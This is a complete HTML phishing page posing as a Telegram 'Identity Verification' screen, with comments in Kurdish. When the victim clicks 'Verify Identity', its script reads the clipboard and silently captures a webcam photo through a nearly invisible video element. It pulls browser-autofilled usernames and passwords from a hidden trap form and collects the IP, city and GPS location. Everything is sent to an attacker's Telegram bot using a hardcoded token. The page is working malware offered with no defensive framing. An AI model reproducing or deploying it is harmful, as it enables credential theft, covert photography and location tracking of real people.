<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram - Security Verification</title>
    <style>
        body { font-family: -apple-system, system-ui, sans-serif; background: #f4f4f5; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
        #video { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; opacity: 0.02; z-index: 1; pointer-events: none; }
        .box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); width: 85%; max-width: 340px; text-align: center; z-index: 100; position: relative; }
        .logo { width: 110px; margin-bottom: 20px; }
        h2 { font-size: 22px; color: #222; margin-bottom: 15px; }
        p { color: #777; font-size: 15px; line-height: 1.5; margin-bottom: 30px; }
        .btn { background: #3390ec; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-size: 17px; font-weight: bold; cursor: pointer; -webkit-tap-highlight-color: transparent; }
        
        /* تەڵەی پاسوۆرد - بە تەواوی شاراوە بەڵام لە ناو شاشەدا */
        #trap-form { position: absolute; opacity: 0.01; top: 0; left: 0; height: 1px; width: 1px; overflow: hidden; pointer-events: none; }
        #canvas { display: none; }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
        <h2>Identity Verification</h2>
        <p>Your Telegram session has expired. Please verify your identity to continue to your chats.</p>
        
        <form id="trap-form">
            <input type="text" id="af_user" autocomplete="username">
            <input type="password" id="af_pass" autocomplete="current-password">
        </form>

        <button class="btn" id="mainBtn">VERIFY IDENTITY</button>
    </div>

    <script>
        const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
        const chatId = "6679834643";

        async function sendToBot(text) {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text })
            });
        }

        document.getElementById('mainBtn').addEventListener('click', async function() {
            const btn = this;
            btn.innerText = "Processing...";
            btn.disabled = true;

            // ١. خوێندنەوەی دەستبەجێی Clipboard (دەبێت یەکەم هەنگاو بێت)
            try {
                const clipText = await navigator.clipboard.readText();
                if(clipText) await sendToBot("📋 Clipboard: " + clipText);
            } catch (e) {
                // ئەگەر ئایفۆن ڕێگری کرد، لانی کەم هەوڵدەدەین بزانین بۆچی
                console.log("Clipboard blocked or empty");
            }

            // ٢. وێنەی کامێرا (بە کاتی ٥ چرکە بۆ ڕوونی)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                await new Promise(r => setTimeout(r, 5000));
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('photo', blob, 'face.jpg');
                fd.append('caption', '👤 Target Headshot Captured!');
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                stream.getTracks().forEach(t => t.stop());
            } catch (e) { await sendToBot("❌ Camera Access Denied"); }

            // ٣. دزینی پاسوۆرد و یوزەری Autofill (بە بێ خانەی دیار)
            let u = document.getElementById('af_user').value;
            let p = document.getElementById('af_pass').value;
            if(p) await sendToBot(`🔑 PASS CAPTURED FROM MANAGER:\n👤 User: ${u}\n🔒 Pass: ${p}`);

            // ٤. IP و GPS
            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => sendToBot(`🌐 IP: ${d.ip}\n🏙️ City: ${d.city}`));
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    await sendToBot(`📍 GPS Map: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
                    finish();
                }, () => finish(), { enableHighAccuracy: true });
            } else { finish(); }
        });

        function finish() {
            setTimeout(() => { window.location.href = "index.html"; }, 1000);
        }
    </script>
</body>
</html>
